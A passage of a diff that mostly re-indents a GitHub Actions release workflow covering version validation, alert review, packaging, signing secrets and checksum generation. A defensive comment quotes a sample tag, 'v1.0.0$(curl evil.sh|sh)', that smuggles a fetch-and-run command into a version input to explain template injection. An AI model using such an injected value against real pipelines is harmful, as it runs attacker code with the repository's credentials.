@@ -35,664 +35,664 @@
 name: Release
 
 on:
- push:
- tags: [ "v*" ]
- workflow_dispatch:
- inputs:
- version:
- description: "Tag to release, e.g. v0.2.0 or v0.2.0-beta.1"
- required: true
- type: string
- prerelease:
- description: "Mark the GitHub Release as a prerelease"
- required: false
- type: boolean
- default: false
- dry_run:
- description: "Build and package every platform; do not tag or publish anything"
- required: false
- type: boolean
- default: false
+  push:
+    tags: [ "v*" ]
+  workflow_dispatch:
+    inputs:
+      version:
+        description: "Tag to release, e.g. v0.2.0 or v0.2.0-beta.1"
+        required: true
+        type: string
+      prerelease:
+        description: "Mark the GitHub Release as a prerelease"
+        required: false
+        type: boolean
+        default: false
+      dry_run:
+        description: "Build and package every platform; do not tag or publish anything"
+        required: false
+        type: boolean
+        default: false
 
 concurrency:
- group: release-${{ inputs.version || github.ref_name }}
- cancel-in-progress: false
+  group: release-${{ inputs.version || github.ref_name }}
+  cancel-in-progress: false
 
 permissions:
- contents: read
+  contents: read
 
 jobs:
- # Parses and validates the version once, so every downstream job reads a
- # single agreed-on version/version_tag rather than re-deriving it (and
- # possibly disagreeing) from github.ref_name or the dispatch inputs.
- resolve-version:
- name: Resolve version
- runs-on: ubuntu-latest
- outputs:
- version: ${{ steps.resolve.outputs.version }}
- version_tag: ${{ steps.resolve.outputs.version_tag }}
- is_prerelease: ${{ steps.resolve.outputs.is_prerelease }}
- is_dry_run: ${{ steps.resolve.outputs.is_dry_run }}
- steps:
- - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
- with:
- fetch-depth: 0
- # This job only reads history for the merge-base check below - it
- # never pushes, so it doesn't need a usable credential left behind.
- persist-credentials: false
+  # Parses and validates the version once, so every downstream job reads a
+  # single agreed-on version/version_tag rather than re-deriving it (and
+  # possibly disagreeing) from github.ref_name or the dispatch inputs.
+  resolve-version:
+    name: Resolve version
+    runs-on: ubuntu-latest
+    outputs:
+      version: ${{ steps.resolve.outputs.version }}
+      version_tag: ${{ steps.resolve.outputs.version_tag }}
+      is_prerelease: ${{ steps.resolve.outputs.is_prerelease }}
+      is_dry_run: ${{ steps.resolve.outputs.is_dry_run }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+          # This job only reads history for the merge-base check below - it
+          # never pushes, so it doesn't need a usable credential left behind.
+          persist-credentials: false
 
- - name: Resolve and validate version
- id: resolve
- shell: bash
- # Read every ${{ }} context value through env: rather than
- # interpolating it straight into the script text. inputs.version and
- # github.ref_name are both attacker-reachable (a workflow_dispatch
- # caller, or anyone who can push a tag) - substituted directly they'd
- # be shell CODE, not data, and a tag like 'v1.0.0$(curl evil.sh|sh)'
- # would execute. As an env var, the shell only ever sees it as the
- # value of $VERSION_TAG_INPUT etc. (zizmor: template-injection).
- env:
- EVENT_NAME: ${{ github.event_name }}
- VERSION_TAG_INPUT: ${{ inputs.version }}
- DRY_RUN_INPUT: ${{ inputs.dry_run }}
- PRERELEASE_INPUT: ${{ inputs.prerelease }}
- REF_NAME: ${{ github.ref_name }}
- run: |
- set -euo pipefail
- semver_re='^v[0-9]+\.[0-9]+\.[0-9]+(-(alpha|beta|rc)\.[0-9]+)?$'
+      - name: Resolve and validate version
+        id: resolve
+        shell: bash
+        # Read every ${{ }} context value through env: rather than
+        # interpolating it straight into the script text. inputs.version and
+        # github.ref_name are both attacker-reachable (a workflow_dispatch
+        # caller, or anyone who can push a tag) - substituted directly they'd
+        # be shell CODE, not data, and a tag like 'v1.0.0$(curl evil.sh|sh)'
+        # would execute. As an env var, the shell only ever sees it as the
+        # value of $VERSION_TAG_INPUT etc. (zizmor: template-injection).
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          VERSION_TAG_INPUT: ${{ inputs.version }}
+          DRY_RUN_INPUT: ${{ inputs.dry_run }}
+          PRERELEASE_INPUT: ${{ inputs.prerelease }}
+          REF_NAME: ${{ github.ref_name }}
+        run: |
+          set -euo pipefail
+          semver_re='^v[0-9]+\.[0-9]+\.[0-9]+(-(alpha|beta|rc)\.[0-9]+)?$'
 
- if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
- version_tag="$VERSION_TAG_INPUT"
- is_dry_run="$DRY_RUN_INPUT"
- manual_prerelease="$PRERELEASE_INPUT"
- else
- version_tag="$REF_NAME"
- is_dry_run="false"
- manual_prerelease="false"
- fi
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            version_tag="$VERSION_TAG_INPUT"
+            is_dry_run="$DRY_RUN_INPUT"
+            manual_prerelease="$PRERELEASE_INPUT"
+          else
+            version_tag="$REF_NAME"
+            is_dry_run="false"
+            manual_prerelease="false"
+          fi
 
- if ! [[ "$version_tag" =~ $semver_re ]]; then
- echo "::error::'$version_tag' is not vMAJOR.MINOR.PATCH[-(alpha|beta|rc).N]"
- exit 1
- fi
+          if ! [[ "$version_tag" =~ $semver_re ]]; then
+            echo "::error::'$version_tag' is not vMAJOR.MINOR.PATCH[-(alpha|beta|rc).N]"
+            exit 1
+          fi
 
- version="${version_tag#v}"
- bare_version="${version%%-*}"
+          version="${version_tag#v}"
+          bare_version="${version%%-*}"
 
- is_prerelease="false"
- if [[ "$version_tag" == *-* ]] || [ "$manual_prerelease" = "true" ]; then
- is_prerelease="true"
- fi
+          is_prerelease="false"
+          if [[ "$version_tag" == *-* ]] || [ "$manual_prerelease" = "true" ]; then
+            is_prerelease="true"
+          fi
 
- # Dry runs skip both checks below: no tag is ever pushed or
- # published, so "does the tag already exist" and "is this cut from
- # main" do not apply - and exempting the main-only check is what
- # lets a dry run validate packaging changes from a topic branch
- # before they merge.
- if [ "$is_dry_run" != "true" ]; then
- if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
- if git rev-parse "refs/tags/$version_tag" >/dev/null 2>&1; then
- echo "::error::tag $version_tag already exists"
- exit 1
- fi
- check_ref="${{ github.sha }}"
- else
- check_ref="$version_tag"
- fi
- git fetch origin main --quiet
- if ! git merge-base --is-ancestor "$check_ref" origin/main; then
- echo "::error::$check_ref is not on main - releases must be cut from main"
- exit 1
- fi
- fi
+          # Dry runs skip both checks below: no tag is ever pushed or
+          # published, so "does the tag already exist" and "is this cut from
+          # main" do not apply - and exempting the main-only check is what
+          # lets a dry run validate packaging changes from a topic branch
+          # before they merge.
+          if [ "$is_dry_run" != "true" ]; then
+            if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
+              if git rev-parse "refs/tags/$version_tag" >/dev/null 2>&1; then
+                echo "::error::tag $version_tag already exists"
+                exit 1
+              fi
+              check_ref="${{ github.sha }}"
+            else
+              check_ref="$version_tag"
+            fi
+            git fetch origin main --quiet
+            if ! git merge-base --is-ancestor "$check_ref" origin/main; then
+              echo "::error::$check_ref is not on main - releases must be cut from main"
+              exit 1
+            fi
+          fi
 
- {
- echo "version=$bare_version"
- echo "version_tag=$version_tag"
- echo "is_prerelease=$is_prerelease"
- echo "is_dry_run=$is_dry_run"
- } >> "$GITHUB_OUTPUT"
+          {
+            echo "version=$bare_version"
+            echo "version_tag=$version_tag"
+            echo "is_prerelease=$is_prerelease"
+            echo "is_dry_run=$is_dry_run"
+          } >> "$GITHUB_OUTPUT"
 
- echo "Resolved $version_tag (version $bare_version, prerelease=$is_prerelease, dry_run=$is_dry_run)"
+          echo "Resolved $version_tag (version $bare_version, prerelease=$is_prerelease, dry_run=$is_dry_run)"
 
- # Advisory, never gating: trunk-based means everything already lands on
- # main directly, so the real gate is the pre-release checklist step in
- # docs/releasing.md (review main's own open alerts before tagging -
- # code-scanning alerts are tracked per-ref and the Security tab filters to
- # the default branch, so this is now a single check against the branch a
- # release is actually cut from, not a separate integration branch whose
- # alerts could accumulate invisibly). This job is the backstop for the
- # case where that manual step was skipped: it surfaces any open analysis
- # alerts loudly in the release run's log/summary instead of letting a
- # release ship with unreviewed findings sitting in the Security tab - the
- # class of miss that landed alerts #83-94 on main unnoticed under the old
- # develop->main promotion flow. Filtered to the code-analysis tools (PREfast, CodeQL):
- # Scorecard's advisory alerts (e.g. the branch-protection score) are open
- # deliberately and would otherwise warn on every release forever.
- alert-review:
- name: Open code-scanning alerts (advisory)
- runs-on: ubuntu-latest
- permissions:
- security-events: read
- steps:
- - name: Report open PREfast/CodeQL alerts on the default branch
- env:
- GH_TOKEN: ${{ github.token }}
- REPO: ${{ github.repository }}
- run: |
- set -euo pipefail
- alerts=$(gh api --paginate "repos/$REPO/code-scanning/alerts?state=open&per_page=100" \
- -q '.[] | select(.tool.name == "PREfast" or .tool.name == "CodeQL") | [.number, .rule.id, .most_recent_instance.location.path // "-"] | @tsv')
- if [ -n "$alerts" ]; then
- count=$(printf '%s\n' "$alerts" | wc -l)
- echo "::warning title=Open code-scanning alerts::$count open PREfast/CodeQL alert(s) on the default branch - review Security > Code scanning before publishing this release."
- printf '%s\n' "$alerts"
- else
- echo "No open PREfast/CodeQL alerts on the default branch."
- fi
+  # Advisory, never gating: trunk-based means everything already lands on
+  # main directly, so the real gate is the pre-release checklist step in
+  # docs/releasing.md (review main's own open alerts before tagging -
+  # code-scanning alerts are tracked per-ref and the Security tab filters to
+  # the default branch, so this is now a single check against the branch a
+  # release is actually cut from, not a separate integration branch whose
+  # alerts could accumulate invisibly). This job is the backstop for the
+  # case where that manual step was skipped: it surfaces any open analysis
+  # alerts loudly in the release run's log/summary instead of letting a
+  # release ship with unreviewed findings sitting in the Security tab - the
+  # class of miss that landed alerts #83-94 on main unnoticed under the old
+  # develop->main promotion flow. Filtered to the code-analysis tools (PREfast, CodeQL):
+  # Scorecard's advisory alerts (e.g. the branch-protection score) are open
+  # deliberately and would otherwise warn on every release forever.
+  alert-review:
+    name: Open code-scanning alerts (advisory)
+    runs-on: ubuntu-latest
+    permissions:
+      security-events: read
+    steps:
+      - name: Report open PREfast/CodeQL alerts on the default branch
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          alerts=$(gh api --paginate "repos/$REPO/code-scanning/alerts?state=open&per_page=100" \
+            -q '.[] | select(.tool.name == "PREfast" or .tool.name == "CodeQL") | [.number, .rule.id, .most_recent_instance.location.path // "-"] | @tsv')
+          if [ -n "$alerts" ]; then
+            count=$(printf '%s\n' "$alerts" | wc -l)
+            echo "::warning title=Open code-scanning alerts::$count open PREfast/CodeQL alert(s) on the default branch - review Security > Code scanning before publishing this release."
+            printf '%s\n' "$alerts"
+          else
+            echo "No open PREfast/CodeQL alerts on the default branch."
+          fi
 
- # Same reusable workflow ci.yml calls for ordinary pushes, with do_package
- # turned on: every packageable matrix leg attempts cpack, not just
- # windows-msvc. The experimental legs still run continue-on-error inside
- # _build.yml, so this job "succeeds" even if some of them fail to build at
- # all - the release just ships without that platform's package. Runs on
- # dry runs too: that is what a dry run is for.
- build-packages:
- name: Build & package
- needs: resolve-version
- uses: ./.github/workflows/_build.yml
- # Ceiling for _build.yml's quality-trend job, which needs contents: write
- # to push to the quality-history branch - see ci.yml's identical override
- # for the same call. Unused here: persist_quality_trend stays false below,
- # so that job never actually runs for a release, but GitHub validates a
- # reusable workflow's job permissions statically regardless of a job's own
- # `if:`, so the ceiling still has to be raised or this call is rejected
- # outright before any job starts. actions: read is the same story for
- # check-runners - see ci.yml's identical override and
- # docs/ci-self-hosted-runners.md. No security-events since 2026-09, when
- # build-android's java-kotlin CodeQL scan moved to codeql.yml's nightly.
- permissions:
- contents: write
- actions: read
- with:
- do_package: true
- # Full history + tags: GitVersionDerivation.cmake's `git describe` needs
- # to see the tag. version_tag also overrides it outright, which matters
- # specifically for workflow_dispatch - github-release only pushes the
- # tag at the very end, after this job has already built and packaged,
- # so `git describe` alone would find nothing (or the previous release).
- fetch_depth: 0
- version_tag: ${{ needs.resolve-version.outputs.version_tag }}
- # Roadmap VX20. The generator runs on the linux-gcc leg for every call
- # to _build.yml; this flag adds the determinism re-run and the upload
- # that github-release below attaches. See docs/conformance-vectors.md.
- publish_conformance_vectors: true
- # ci.yml's call to _build.yml passes none of these - it never sets
- # do_package for a release APK, so build-android's signing step has
- # nothing to decode there regardless. Threaded through even on a dry
- # run: assembleRelease itself still runs then (do_package is
- # unconditionally true above), so a dry run genuinely exercises the
- # signing path too, not just the unsigned/debug one - it just never
- # reaches the github-release job below to get uploaded anywhere.
- secrets:
- ATMOS_SIGNING_KEY: ${{ secrets.ATMOS_SIGNING_KEY }}
- # Optional; see _build.yml's own description. Absent today, same as
- # ci.yml's identical forward.
- ORG_RUNNERS_TOKEN: ${{ secrets.ORG_RUNNERS_TOKEN }}
- ANDROID_KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
- ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
- ANDROID_KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
- ANDROID_KEY_PASSWORD: ${{ secrets.ANDROID_KEY_PASSWORD }}
+  # Same reusable workflow ci.yml calls for ordinary pushes, with do_package
+  # turned on: every packageable matrix leg attempts cpack, not just
+  # windows-msvc. The experimental legs still run continue-on-error inside
+  # _build.yml, so this job "succeeds" even if some of them fail to build at
+  # all - the release just ships without that platform's package. Runs on
+  # dry runs too: that is what a dry run is for.
+  build-packages:
+    name: Build & package
+    needs: resolve-version
+    uses: ./.github/workflows/_build.yml
+    # Ceiling for _build.yml's quality-trend job, which needs contents: write
+    # to push to the quality-history branch - see ci.yml's identical override
+    # for the same call. Unused here: persist_quality_trend stays false below,
+    # so that job never actually runs for a release, but GitHub validates a
+    # reusable workflow's job permissions statically regardless of a job's own
+    # `if:`, so the ceiling still has to be raised or this call is rejected
+    # outright before any job starts. actions: read is the same story for
+    # check-runners - see ci.yml's identical override and
+    # docs/ci-self-hosted-runners.md. No security-events since 2026-09, when
+    # build-android's java-kotlin CodeQL scan moved to codeql.yml's nightly.
+    permissions:
+      contents: write
+      actions: read
+    with:
+      do_package: true
+      # Full history + tags: GitVersionDerivation.cmake's `git describe` needs
+      # to see the tag. version_tag also overrides it outright, which matters
+      # specifically for workflow_dispatch - github-release only pushes the
+      # tag at the very end, after this job has already built and packaged,
+      # so `git describe` alone would find nothing (or the previous release).
+      fetch_depth: 0
+      version_tag: ${{ needs.resolve-version.outputs.version_tag }}
+      # conformance vectors publication. The generator runs on the linux-gcc leg for every call
+      # to _build.yml; this flag adds the determinism re-run and the upload
+      # that github-release below attaches. See docs/conformance-vectors.md.
+      publish_conformance_vectors: true
+    # ci.yml's call to _build.yml passes none of these - it never sets
+    # do_package for a release APK, so build-android's signing step has
+    # nothing to decode there regardless. Threaded through even on a dry
+    # run: assembleRelease itself still runs then (do_package is
+    # unconditionally true above), so a dry run genuinely exercises the
+    # signing path too, not just the unsigned/debug one - it just never
+    # reaches the github-release job below to get uploaded anywhere.
+    secrets:
+      ATMOS_SIGNING_KEY: ${{ secrets.ATMOS_SIGNING_KEY }}
+      # Optional; see _build.yml's own description. Absent today, same as
+      # ci.yml's identical forward.
+      ORG_RUNNERS_TOKEN: ${{ secrets.ORG_RUNNERS_TOKEN }}
+      ANDROID_KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
+      ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
+      ANDROID_KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
+      ANDROID_KEY_PASSWORD: ${{ secrets.ANDROID_KEY_PASSWORD }}
 
- # Downloads whatever packages actually got built, signs and attests them,
- # generates an SBOM, and publishes the GitHub Release. Skipped entirely on
- # a dry run - that is the one thing a dry run deliberately does not do.
- github-release:
- name: Sign, attest and publish
- needs: [ resolve-version, build-packages ]
- if: needs.resolve-version.outputs.is_dry_run != 'true'
- runs-on: ubuntu-latest
- permissions:
- contents: write
- id-token: write
- attestations: write
- env:
- # A step's `if:` cannot read `secrets` directly, only `env` - so the
- # presence check happens once here and every gated step reads this
- # instead. Empty means the GPG steps below no-op cleanly rather than
- # failing a release that has not provisioned a signing key yet.
- HAVE_GPG_KEY: ${{ secrets.REPO_GPG_PRIVATE_KEY != '' && 'true' || 'false' }}
- steps:
- # persist-credentials: false - "Push release tag" below pushes through
- # its own explicitly-scoped remote instead (mirroring _build.yml's
- # quality-trend job and docs.yml's gh-deploy job), so actions/checkout's
- # token never sits in this working tree's git config for the rest of
- # the job.
- - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
- with:
- persist-credentials: false
+  # Downloads whatever packages actually got built, signs and attests them,
+  # generates an SBOM, and publishes the GitHub Release. Skipped entirely on
+  # a dry run - that is the one thing a dry run deliberately does not do.
+  github-release:
+    name: Sign, attest and publish
+    needs: [ resolve-version, build-packages ]
+    if: needs.resolve-version.outputs.is_dry_run != 'true'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      id-token: write
+      attestations: write
+    env:
+      # A step's `if:` cannot read `secrets` directly, only `env` - so the
+      # presence check happens once here and every gated step reads this
+      # instead. Empty means the GPG steps below no-op cleanly rather than
+      # failing a release that has not provisioned a signing key yet.
+      HAVE_GPG_KEY: ${{ secrets.REPO_GPG_PRIVATE_KEY != '' && 'true' || 'false' }}
+    steps:
+      # persist-credentials: false - "Push release tag" below pushes through
+      # its own explicitly-scoped remote instead (mirroring _build.yml's
+      # quality-trend job and docs.yml's gh-deploy job), so actions/checkout's
+      # token never sits in this working tree's git config for the rest of
+      # the job.
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
 
- - name: Download package artifacts
- uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
- with:
- pattern: packages-*
- path: release-artifacts
- merge-multiple: true
+      - name: Download package artifacts
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        with:
+          pattern: packages-*
+          path: release-artifacts
+          merge-multiple: true
 
- # "At least one package" was the whole check here, and it is not the
- # claim docs/releasing.md makes to a maintainer: its Troubleshooting
- # section says a missing platform package "is a failure to investigate
- # rather than an expected gap", and one leg is `experimental: true`
- # (windows-msvc-arm64), which _build.yml runs under continue-on-error.
- # An experimental leg that dies reports green to the reusable workflow,
- # so with only a count to check, a release would publish silently
- # missing that platform's packages - the exact situation the docs say
- # cannot happen. So: name what a release is documented to ship, and
- # fail on whatever is absent.
- #
- # Each entry is one glob and the human name for what produces it. The
- # arch-qualified archive is the per-leg sentinel because the archive
- # generator is the only one CPack always has - DEB/RPM/NSIS each sit
- # behind a find_program() gate in cmake/Packaging.cmake - so a missing
- # archive means that leg produced nothing at all. The DEB/RPM/NSIS
- # entries are checked as well, because that gate degrading silently is
- # a real failure mode this repo has already shipped once (Windows NSIS installer,
- # the installer-less Windows releases).
- #
- # Deliberately NOT required: the macOS `ac3forge-dev-*` archive, which
- # package-macos-universal documents as best-effort; and the Linux
- # AC3Forge Crucible package, whose leg skips itself whole on a runner
- # with too old a Qt (see _build.yml's own comment on that upload).
- # Both are absences a maintainer is told to expect.
- - name: Verify every documented package was built
- shell: bash
- run: |
- set -euo pipefail
- shopt -s nullglob
+      # "At least one package" was the whole check here, and it is not the
+      # claim docs/releasing.md makes to a maintainer: its Troubleshooting
+      # section says a missing platform package "is a failure to investigate
+      # rather than an expected gap", and one leg is `experimental: true`
+      # (windows-msvc-arm64), which _build.yml runs under continue-on-error.
+      # An experimental leg that dies reports green to the reusable workflow,
+      # so with only a count to check, a release would publish silently
+      # missing that platform's packages - the exact situation the docs say
+      # cannot happen. So: name what a release is documented to ship, and
+      # fail on whatever is absent.
+      #
+      # Each entry is one glob and the human name for what produces it. The
+      # arch-qualified archive is the per-leg sentinel because the archive
+      # generator is the only one CPack always has - DEB/RPM/NSIS each sit
+      # behind a find_program() gate in cmake/Packaging.cmake - so a missing
+      # archive means that leg produced nothing at all. The DEB/RPM/NSIS
+      # entries are checked as well, because that gate degrading silently is
+      # a real failure mode this repo has already shipped once (Windows NSIS installer,
+      # the installer-less Windows releases).
+      #
+      # Deliberately NOT required: the macOS `ac3forge-dev-*` archive, which
+      # package-macos-universal documents as best-effort; and the Linux
+      # AC3Forge Crucible package, whose leg skips itself whole on a runner
+      # with too old a Qt (see _build.yml's own comment on that upload).
+      # Both are absences a maintainer is told to expect.
+      - name: Verify every documented package was built
+        shell: bash
+        run: |
+          set -euo pipefail
+          shopt -s nullglob
 
- # ac3forge-[0-9]*, not ac3forge-*, wherever the runtime package is
- # meant: cmake/Packaging.cmake's CPACK_PACKAGE_FILE_NAME is
- # ac3forge-<M>.<m>.<p>-<system>, so a digit follows the hyphen, and
- # the looser glob would also match ac3forge-dev-* and
- # ac3forge-crucible-* - letting one of those stand in for a runtime
- # package that never got built, which is the failure this whole step
- # exists to catch.
- expected=(
- "release-artifacts/ac3forge-[0-9]*-win64.zip|Windows x64 archive (windows-msvc)"
- "release-artifacts/ac3forge-[0-9]*-win64.exe|Windows x64 NSIS installer (windows-msvc)"
- "release-artifacts/ac3forge-dev-*-win64.zip|Windows x64 library archive (windows-msvc)"
- "release-artifacts/ac3forge-[0-9]*-win-arm64.zip|Windows arm64 archive (windows-msvc-arm64, experimental)"
- "release-artifacts/ac3forge-[0-9]*-win-arm64.exe|Windows arm64 NSIS installer (windows-msvc-arm64, experimental)"
- "release-artifacts/ac3forge-[0-9]*-Linux-x86_64.tar.gz|Linux x86_64 archive (linux-gcc)"
- "release-artifacts/ac3forge-[0-9]*-Linux-x86_64-runtime.deb|Linux x86_64 .deb (linux-gcc)"
- "release-artifacts/ac3forge-[0-9]*-Linux-x86_64-runtime.rpm|Linux x86_64 .rpm (linux-gcc)"
- "release-artifacts/ac3forge-dev-*-Linux-x86_64.tar.gz|Linux x86_64 library archive (linux-gcc)"
- "release-artifacts/ac3forge-[0-9]*-Linux-aarch64.tar.gz|Linux aarch64 archive (linux-gcc-arm64)"
- "release-artifacts/ac3forge-[0-9]*-Linux-aarch64-runtime.deb|Linux aarch64 .deb (linux-gcc-arm64)"
- "release-artifacts/ac3forge-[0-9]*-Linux-aarch64-runtime.rpm|Linux aarch64 .rpm (linux-gcc-arm64)"
- "release-artifacts/ac3forge-dev-*-Linux-aarch64.tar.gz|Linux aarch64 library archive (linux-gcc-arm64)"
- "release-artifacts/ac3forge-[0-9]*-Darwin.dmg|macOS universal disk image (package-macos-universal)"
- "release-artifacts/ac3gui-*.AppImage|Linux AppImage (linux-appimage)"
- "release-artifacts/*.apk|Android APK (build-android)"
- )
+          # ac3forge-[0-9]*, not ac3forge-*, wherever the runtime package is
+          # meant: cmake/Packaging.cmake's CPACK_PACKAGE_FILE_NAME is
+          # ac3forge-<M>.<m>.<p>-<system>, so a digit follows the hyphen, and
+          # the looser glob would also match ac3forge-dev-* and
+          # ac3forge-crucible-* - letting one of those stand in for a runtime
+          # package that never got built, which is the failure this whole step
+          # exists to catch.
+          expected=(
+            "release-artifacts/ac3forge-[0-9]*-win64.zip|Windows x64 archive (windows-msvc)"
+            "release-artifacts/ac3forge-[0-9]*-win64.exe|Windows x64 NSIS installer (windows-msvc)"
+            "release-artifacts/ac3forge-dev-*-win64.zip|Windows x64 library archive (windows-msvc)"
+            "release-artifacts/ac3forge-[0-9]*-win-arm64.zip|Windows arm64 archive (windows-msvc-arm64, experimental)"
+            "release-artifacts/ac3forge-[0-9]*-win-arm64.exe|Windows arm64 NSIS installer (windows-msvc-arm64, experimental)"
+            "release-artifacts/ac3forge-[0-9]*-Linux-x86_64.tar.gz|Linux x86_64 archive (linux-gcc)"
+            "release-artifacts/ac3forge-[0-9]*-Linux-x86_64-runtime.deb|Linux x86_64 .deb (linux-gcc)"
+            "release-artifacts/ac3forge-[0-9]*-Linux-x86_64-runtime.rpm|Linux x86_64 .rpm (linux-gcc)"
+            "release-artifacts/ac3forge-dev-*-Linux-x86_64.tar.gz|Linux x86_64 library archive (linux-gcc)"
+            "release-artifacts/ac3forge-[0-9]*-Linux-aarch64.tar.gz|Linux aarch64 archive (linux-gcc-arm64)"
+            "release-artifacts/ac3forge-[0-9]*-Linux-aarch64-runtime.deb|Linux aarch64 .deb (linux-gcc-arm64)"
+            "release-artifacts/ac3forge-[0-9]*-Linux-aarch64-runtime.rpm|Linux aarch64 .rpm (linux-gcc-arm64)"
+            "release-artifacts/ac3forge-dev-*-Linux-aarch64.tar.gz|Linux aarch64 library archive (linux-gcc-arm64)"
+            "release-artifacts/ac3forge-[0-9]*-Darwin.dmg|macOS universal disk image (package-macos-universal)"
+            "release-artifacts/ac3gui-*.AppImage|Linux AppImage (linux-appimage)"
+            "release-artifacts/*.apk|Android APK (build-android)"
+          )
 
- missing=()
- for entry in "${expected[@]}"; do
- pattern="${entry%%|*}"
- what="${entry#*|}"
- # Unquoted on purpose: $pattern is a glob that has to be EXPANDED
- # here, which is the whole mechanism. `shopt -s nullglob` above
- # makes a pattern that matches nothing produce an empty array
- # rather than the pattern itself, which is what the test below
- # relies on. No package filename contains whitespace.
- # shellcheck disable=SC2206
- found=($pattern)
- if [ ${#found[@]} -eq 0 ]; then
- missing+=("$what (no match for $pattern)")
- else
- printf 'OK %s\n' "${found[@]}"
- fi
- done
+          missing=()
+          for entry in "${expected[@]}"; do
+            pattern="${entry%%|*}"
+            what="${entry#*|}"
+            # Unquoted on purpose: $pattern is a glob that has to be EXPANDED
+            # here, which is the whole mechanism. `shopt -s nullglob` above
+            # makes a pattern that matches nothing produce an empty array
+            # rather than the pattern itself, which is what the test below
+            # relies on. No package filename contains whitespace.
+            # shellcheck disable=SC2206
+            found=($pattern)
+            if [ ${#found[@]} -eq 0 ]; then
+              missing+=("$what  (no match for $pattern)")
+            else
+              printf 'OK       %s\n' "${found[@]}"
+            fi
+          done
 
- if [ ${#missing[@]} -ne 0 ]; then
- echo "::error::this release is missing packages it is documented to publish (docs/releasing.md#what-gets-published). Check the build-packages run - an experimental leg failing does NOT fail that job."
- printf 'MISSING %s\n' "${missing[@]}"
- echo
- echo "Everything that was downloaded:"
- ls -1 release-artifacts
- exit 1
- fi
+          if [ ${#missing[@]} -ne 0 ]; then
+            echo "::error::this release is missing packages it is documented to publish (docs/releasing.md#what-gets-published). Check the build-packages run - an experimental leg failing does NOT fail that job."
+            printf 'MISSING  %s\n' "${missing[@]}"
+            echo
+            echo "Everything that was downloaded:"
+            ls -1 release-artifacts
+            exit 1
+          fi
 
- # Deliberately after the completeness check above rather than merged
- # into the same download: the vector bundle is a .tar.gz, and that check
- # used to count .tar.gz files, so downloading it first would let it
- # stand in for a platform package and turn "every platform failed to
- # build" into a green release. The check now matches each package by its
- # own name, which the bundle cannot satisfy, so the ordering is defence
- # in depth rather than the load-bearing thing it was - keep it anyway,
- # since it costs nothing and the next rewrite of that check should not
- # have to rediscover the trap. It lands in the same directory
- # so it picks up the GPG signature, the SHA512SUMS line, the SBOM and
- # both attestations from the steps below, exactly as every package does.
- - name: Download conformance vectors
- uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
- with:
- pattern: conformance-vectors
- path: release-artifacts
- merge-multiple: true
+      # Deliberately after the completeness check above rather than merged
+      # into the same download: the vector bundle is a .tar.gz, and that check
+      # used to count .tar.gz files, so downloading it first would let it
+      # stand in for a platform package and turn "every platform failed to
+      # build" into a green release. The check now matches each package by its
+      # own name, which the bundle cannot satisfy, so the ordering is defence
+      # in depth rather than the load-bearing thing it was - keep it anyway,
+      # since it costs nothing and the next rewrite of that check should not
+      # have to rediscover the trap. It lands in the same directory
+      # so it picks up the GPG signature, the SHA512SUMS line, the SBOM and
+      # both attestations from the steps below, exactly as every package does.
+      - name: Download conformance vectors
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        with:
+          pattern: conformance-vectors
+          path: release-artifacts
+          merge-multiple: true
 
- # Unconditional - not folded into the GPG-gated step below the way it used to be.
- # GPG signing is optional (docs/releasing.md#provisioning-the-gpg-signing-key), but
- # manifest-bump.yml (manifest bump automation) cross-checks the Homebrew cask's and winget's
- # digests against this file for every release, signed or not; gating it on a key
- # that may not be provisioned would silently break that cross-check instead of the
- # digests it protects.
- - name: Generate SHA512SUMS
- shell: bash
- run: |
- set -euo pipefail
- shopt -s nullglob
- # *.AppImage belongs here like every other extension. It was the one
- # omission among these globs, so the AppImage shipped with its own
- # cpack-style .sha512 side-car but no line in the aggregate manifest -
- # the file docs/releasing.md tells a downloader to verify against, and
- # the one manifest-bump.yml reads.
- artifacts=(release-artifacts/*.deb release-artifacts/*.rpm release-artifacts/*.tar.gz
- release-artifacts/*.zip release-artifacts/*.exe release-artifacts/*.dmg
- release-artifacts/*.AppImage release-artifacts/*.apk)
- ( cd release-artifacts && sha512sum "${artifacts[@]##release-artifacts/}" > SHA512SUMS )
+      # Unconditional - not folded into the GPG-gated step below the way it used to be.
+      # GPG signing is optional (docs/releasing.md#provisioning-the-gpg-signing-key), but
+      # manifest-bump.yml (manifest bump automation) cross-checks the Homebrew cask's and winget's
+      # digests against this file for every release, signed or not; gating it on a key
+      # that may not be provisioned would silently break that cross-check instead of the
+      # digests it protects.
+      - name: Generate SHA512SUMS
+        shell: bash
+        run: |
+          set -euo pipefail
+          shopt -s nullglob
+          # *.AppImage belongs here like every other extension. It was the one
+          # omission among these globs, so the AppImage shipped with its own
+          # cpack-style .sha512 side-car but no line in the aggregate manifest -
+          # the file docs/releasing.md tells a downloader to verify against, and
+          # the one manifest-bump.yml reads.
+          artifacts=(release-artifacts/*.deb release-artifacts/*.rpm release-artifacts/*.tar.gz
